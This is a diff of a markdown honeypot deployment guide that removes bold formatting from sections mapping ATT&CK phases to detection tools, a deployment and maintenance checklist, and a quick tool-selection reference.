 - Tools: OpenCanary port scan detection, any honeypot connection attempt
-- Coverage: HIGH — any automated scanner will hit honeypots
+- Coverage: HIGH: any automated scanner will hit honeypots
 
-**Initial Access Phase** (ATT&CK TA0001):
+Initial Access Phase (ATT&CK TA0001):
 - Honeypots detect: Exploit public-facing application (T1190), valid accounts (T1078)
 - Tools: Dionaea, Elasticpot, Log4Pot, CitrixHoneypot, AD canary accounts
-- Coverage: MEDIUM-HIGH — depends on honeypot placement relative to attack vector
+- Coverage: MEDIUM-HIGH: depends on honeypot placement relative to attack vector
 
-**Execution Phase** (ATT&CK TA0002):
+Execution Phase (ATT&CK TA0002):
 - Honeypots detect: Command and scripting interpreter (T1059), user execution
 - Tools: Cowrie (captures all commands in fake shell), Tanner (web app commands)
 - Coverage: HIGH for SSH/web vectors
 
-**Lateral Movement Phase** (ATT&CK TA0008):
+Lateral Movement Phase (ATT&CK TA0008):
 - Honeypots detect: Remote services (T1021), internal spearphishing
 - Tools: Cowrie, OpenCanary SMBD, Rdpy, Heralding
-- Coverage: VERY HIGH — lateral movement almost always hits honeypots if deployed at 1 per subnet
+- Coverage: VERY HIGH: lateral movement almost always hits honeypots if deployed at 1 per subnet
 
-**Credential Access Phase** (ATT&CK TA0006):
+Credential Access Phase (ATT&CK TA0006):
 - Honeypots detect: Brute force (T1110), credentials from stores (T1555)
 - Tools: Cowrie, Heralding, AD canary accounts, canary credentials
 - Coverage: HIGH
@@ -1751,7 +1751,7 @@ MITRE D3FEND is the defensive complement to ATT&CK, providing a knowledge base o
 
 ### 8.5 Deployment Checklist
 
-**Pre-Deployment**:
+Pre-Deployment:
 - Define honeypot IP addresses (unused IPs in production subnets)
 - Ensure honeypot IPs are excluded from DHCP pools
 - Remove honeypot IPs from DNS (should not resolve)
@@ -1761,7 +1761,7 @@ MITRE D3FEND is the defensive complement to ATT&CK, providing a knowledge base o
 - Notify IT staff that honeypot IPs are decoys (to prevent internal false alarms)
 - Configure NTP synchronization for accurate timestamps
 
-**Post-Deployment**:
+Post-Deployment:
 - Verify honeypot services are responding on expected ports
 - Test alert pipeline (trigger a test connection, verify alert received)
 - Confirm logs are flowing to SIEM
@@ -1770,7 +1770,7 @@ MITRE D3FEND is the defensive complement to ATT&CK, providing a knowledge base o
 - Schedule quarterly review of honeypot effectiveness
 - Set up automated malware sample submission (VirusTotal/MalwareBazaar)
 
-**Maintenance**:
+Maintenance:
 - Monthly: Review captured attack data, update threat intelligence
 - Quarterly: Rotate honeypot IPs and banners to prevent fingerprinting
 - Semi-annually: Add new protocol emulation based on current threat landscape
@@ -1778,24 +1778,24 @@ MITRE D3FEND is the defensive complement to ATT&CK, providing a knowledge base o
 
 ### 8.6 Quick Reference: Honeypot Selection Guide
 
-**I need to detect network reconnaissance** -> OpenCanary with port scan detection enabled
+I need to detect network reconnaissance -> OpenCanary with port scan detection enabled
 
-**I need to capture SSH brute-force and attacker commands** -> Cowrie
+I need to capture SSH brute-force and attacker commands -> Cowrie
 
-**I need to capture malware binaries** -> Dionaea (focus on SMB/445)
+I need to capture malware binaries -> Dionaea (focus on SMB/445)
 
-**I need a comprehensive research platform** -> T-Pot
+I need a comprehensive research platform -> T-Pot
 
-**I need to detect credential theft** -> Canarytokens (AWS keys, AD account, Word docs)
+I need to detect credential theft -> Canarytokens (AWS keys, AD account, Word docs)
 
-**I need to detect data exfiltration from file shares** -> Honeyfiles with canarytokens
+I need to detect data exfiltration from file shares -> Honeyfiles with canarytokens
 
-**I need to detect IoT botnet scanning** -> Cowrie on Telnet port 23 or MTPot
+I need to detect IoT botnet scanning -> Cowrie on Telnet port 23 or MTPot
 
-**I need to detect web application attacks** -> SNARE/Tanner
+I need to detect web application attacks -> SNARE/Tanner
 
-**I need enterprise-grade managed deception** -> Thinkst Canary (commercial) or Attivo/SentinelOne
+I need enterprise-grade managed deception -> Thinkst Canary (commercial) or Attivo/SentinelOne
 
-**I need ICS/SCADA honeypots** -> ConPot (included in T-Pot)
+I need ICS/SCADA honeypots -> ConPot (included in T-Pot)
 
-**I need to detect lateral movement in Windows environments** -> OpenCanary with SMB enabled + AD canary accounts in every OU
+I need to detect lateral movement in Windows environments -> OpenCanary with SMB enabled + AD canary accounts in every OU
